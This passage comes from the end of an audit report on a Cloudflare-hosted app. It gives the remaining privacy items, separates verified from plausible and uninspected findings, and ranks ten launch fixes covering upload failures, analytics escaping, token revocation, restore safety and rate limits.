5. Google Fonts loaded from Google's servers (IP transfer to a US provider; German case law has fined this). Self-host — the DM Sans base64 for PDFs already exists (`src/assets/fonts/dmSansBase64.ts`).
6. Cloudflare DPA and data-location: confirm D1/R2 location, sign Cloudflare's DPA (self-serve), list Cloudflare as sub-processor.
7. Retention of Worker logs with e-mail addresses; stop logging the address (log a hash or the user id).
8. "Inactive beta accounts may be deleted" — no code does this; either drop the sentence or implement.

---

## 6. Separation of certainty

**VERIFIED (code read, reproducible by reading):** 1.1, 1.2, 1.3, 1.4, 1.6, 2.1, 2.2, 2.3, 3.1–3.9, 4.1, 4.2, the route table, the deletion inventory, the data inventory.

**PLAUSIBLE (depends on platform behaviour not in the repo):** WKWebView storage eviction; IndexedDB single-value limits on iPad; D1 Time Travel availability; ITP applicability to the Capacitor shell; Cloudflare log retention period.

**UNINSPECTED:** Cloudflare dashboard (WAF rules, rate limits, billing alerts, D1/R2 location, plan); the native camera plugin's Swift capture path; the e2e suite's actual coverage of upload failures; the `site/` Worker (`site/wrangler.toml`) beyond the static legal pages; third-party dependencies for known vulnerabilities (`npm audit` not run — no network here).

---

## 7. Prioritised top-10 fixes

| # | Fix | Finding | Difficulty | Blocks launch |
|---|---|---|---|---|
| 1 | A failed picture upload fails the push (or at least un-marks the frame and keeps the pending copy); add "N pictures waiting" to the UI; bench test with a 503 | 1.1 | S/M | yes |
| 2 | Escape everything in the analytics HTML; whitelist `/track` event names and cap `meta`; move the admin token out of the URL; CSP on `/analytics*` | 3.1 | S | yes |
| 3 | Revoke the GitHub PAT; credential helper or SSH | 3.2 | S | yes |
| 4 | Restore refuses when the pre-restore point cannot be written; tell the user when a project is too large for restore points (then raise the cap / move snapshots to R2) | 1.2 | S (+M) | yes |
| 5 | Pin `server.url` to `framehow.com/app` before the first tester installs; never change it again without migration | 1.4 | S | yes |
| 6 | Write the true recovery windows into Terms/Privacy and the in-app texts (shots ≤ 48 h, account 7 d admin-only, no backups); fix the "cannot be undone" dialog | 1.3, §5 | S (text) | yes |
| 7 | WAF rate limits on `/auth/*`, `/track`, `/upload`; Cloudflare billing alert; fire-and-forget welcome mail | 3.4, 4.1, 4.2 | S (dashboard) | before public sign-up |
| 8 | Validate `r2_key` prefix on sync/restore; size deletions from `bucket.head()` not from client rows; atomic quota reservation | 3.3, 2.1, 1.6 | S | no |
| 9 | Caps: min picture size, objects/account, projects/account, frames/project, saved points/project, `/track` body, `device_name` | 2.2 | S/M | no |
| 10 | Give unreferenced files a 7-day grace in the cleaner so every "delete" honours one promise; self-host fonts; stop logging e-mail addresses; tag device copies with the user id | 1.3, §5 items 5/7, 3.9 | M | no |

Two further suggestions that cost little and protect production material most: (a) a weekly `wrangler d1 export` of `framehow-db` to a private R2 prefix (M, gives a real backup to put in the Privacy Policy); (b) a nightly line in the admin mail with "pictures held only on devices" is impossible, but "frames on the server without a picture whose version has a drawing or label" is a cheap proxy for 1.1 and would have shown the problem.
